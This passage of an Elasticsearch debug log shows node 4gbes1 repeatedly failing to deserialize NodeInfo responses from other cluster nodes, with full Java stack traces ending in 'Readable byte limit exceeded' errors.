    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,371][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,374][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,588][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [RgzCfs2_RE27p6RgzEb1Jw]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,590][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:310)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,589][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,590][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,595][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8434
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 01:00:06,800][DEBUG][action.admin.cluster.node.info] [4gbes1] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
